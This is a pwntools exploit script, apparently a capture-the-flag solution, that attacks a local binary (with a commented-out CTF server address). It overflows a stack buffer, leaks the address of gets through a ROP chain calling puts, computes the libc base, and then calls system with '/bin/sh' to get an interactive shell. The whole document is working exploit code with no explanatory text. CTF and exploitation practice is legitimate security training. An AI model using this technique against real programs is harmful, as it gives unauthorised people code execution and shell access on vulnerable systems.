#!/usr/bin/env python3
from pwn import *
 
elf  = context.binary = ELF('./main')
libc = elf.libc

io =  process()
# io = remote("ctf.cyberalpha.org", 8501)   # Change it to remote server IP & Port

rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]


payload = flat(
    cyclic(256+8),
    POP_RDI,
    p64(elf.got.gets),
    p64(elf.plt.puts),
    p64(elf.sym.main)
)

io.sendline(payload)
io.recvuntil(b"Not that john!")
io.recvline()

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked gets Addr:- %#x" % leak)

libc.address = leak - libc.symbols.gets
log.info(f"Libc Base:- %#x" % libc.address)

payload = flat(
    cyclic(256+8),
    POP_RDI,
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(RET),
    p64(libc.sym.system)
)

io.sendline(payload)
io.interactive()